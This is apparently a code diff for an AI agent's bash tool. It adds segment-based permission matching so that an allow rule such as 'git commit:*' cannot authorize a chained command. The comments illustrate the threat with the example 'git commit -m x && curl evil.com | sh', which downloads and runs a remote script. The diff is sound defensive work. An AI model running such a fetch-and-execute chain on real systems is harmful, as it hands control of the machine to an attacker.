@@ -16,7 +16,8 @@ import {
 	untrackDetachedChildPid,
 } from "../../utils/shell.ts";
 import type { ExtensionContext, ToolRenderResultOptions } from "../extensions/types.ts";
-import type { ApexToolDefinition } from "./contract.ts";
+import { classifyBashCommand } from "./bash-command-segments.ts";
+import type { ApexToolDefinition, PermissionSpec } from "./contract.ts";
 import { OutputAccumulator } from "./output-accumulator.ts";
 import { getTextOutput, invalidArgText, str } from "./render-utils.ts";
 import { wrapToolDefinition } from "./tool-definition-wrapper.ts";
@@ -49,6 +50,59 @@ export const bashToolSystemPromptContribution = {
 } as const;
 
 export type BashToolInput = Static<typeof bashSchema>;
+
+function normalizeSegment(text: string): string {
+	return text.trim().replace(/\s+/g, " ");
+}
+
+/**
+ * A rule matches a segment either by exact text, or — when it ends with the `:*`
+ * suffix convention (e.g. `git commit:*`) — by prefix: the segment must equal the
+ * prefix or start with the prefix followed by a space. `git commit:*` therefore
+ * matches `git commit` and `git commit -m x`, but not `git commitment` (word
+ * boundary enforced) and not an unrelated segment in the same chained command.
+ */
+function segmentMatchesRule(segment: string, ruleContent: string): boolean {
+	const normalizedSegment = normalizeSegment(segment);
+	const normalizedRule = normalizeSegment(ruleContent);
+	if (normalizedRule.endsWith(":*")) {
+		const prefix = normalizedRule.slice(0, -2).trim();
+		if (!prefix) return false;
+		return normalizedSegment === prefix || normalizedSegment.startsWith(`${prefix} `);
+	}
+	return normalizedSegment === normalizedRule;
+}
+
+/**
+ * bash's permission grammar (ADR 0004). A rule authorizes a call only if the
+ * command decomposes cleanly into segments (never on "unparseable") and **every**
+ * segment matches — a narrow rule like `git commit:*` can never authorize
+ * `git commit -m x && curl evil.com | sh`, because `curl evil.com` and `sh` are
+ * separate segments that do not match it.
+ *
+ * `ruleForCall` only generalizes a single-segment command: a multi-segment chain
+ * has no single non-trivial rule that captures exactly what it did, and returning
+ * one would either over-authorize (if loose) or be indistinguishable from an exact
+ * match (if not) — `null` correctly forces `ask` for "always allow this" on a chain.
+ */
+export function createBashPermissionSpec(): PermissionSpec<typeof bashSchema> {
+	return {
+		defaultBehavior: "ask",
+		matches(ruleContent, params) {
+			const classification = classifyBashCommand(params.command);
+			if (classification.type !== "segments") return false;
+			return classification.segments.every((segment) => segmentMatchesRule(segment, ruleContent));
+		},
+		describe(ruleContent) {
+			return `Run bash commands matching "${ruleContent}"`;
+		},
+		ruleForCall(params) {
+			const classification = classifyBashCommand(params.command);
+			if (classification.type !== "segments" || classification.segments.length !== 1) return null;
+			return normalizeSegment(classification.segments[0]);
+		},
+	};
+}
 
 export interface BashToolDetails {
 	truncation?: TruncationResult;
@@ -336,16 +390,7 @@ export function createBashToolDefinition(
 		parameters: bashSchema,
 		contract: {
 			capabilities: new Set(["exec"]),
-			// Interim exact-match grammar. Task 2a.2 replaces this with segment
-			// decomposition (every chained command must match; unparseable → ask) —
-			// a prefix match here would let `git commit:*` authorize
-			// `git commit -m x && curl evil.com | sh` (ADR 0004).
-			permission: {
-				defaultBehavior: "ask",
-				matches: (ruleContent, params) => ruleContent === params.command,
-				describe: (ruleContent) => `Run exactly: ${ruleContent}`,
-				ruleForCall: (params) => params.command,
-			},
+			permission: createBashPermissionSpec(),
 			context: { resultRecoverable: false, deferSchema: false },
 			evidence: {
 				emits: new Set(["command"]),
